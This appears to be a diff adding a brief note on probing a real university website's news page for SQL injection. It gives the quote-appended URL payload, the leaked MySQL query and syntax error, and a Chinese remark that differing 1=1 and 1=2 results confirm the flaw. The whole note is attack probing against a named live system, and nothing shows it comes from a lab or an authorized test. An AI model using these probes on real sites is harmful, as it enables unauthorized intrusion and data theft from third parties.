@@ -1,0 +1,7 @@
+http://yjszs.hfut.edu.cn/news.php?id=188'
+:SELECT t.* FROM gd_tbnews t WHERE 1=1 AND t.sysid IN (188') ORDER BY t.iftop DESC,t.ordernum DESC,t.posttime DESC,t.sysid DESC 
+MySQL Server Error:
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') ORDER BY t.iftop DESC,t.ordernum DESC,t.posttime DESC,t.sysid DESC' at line 1 ( 1064 )
+
+ 然后
+1=1 1=2结果不一样说明存在注入漏洞 . 	
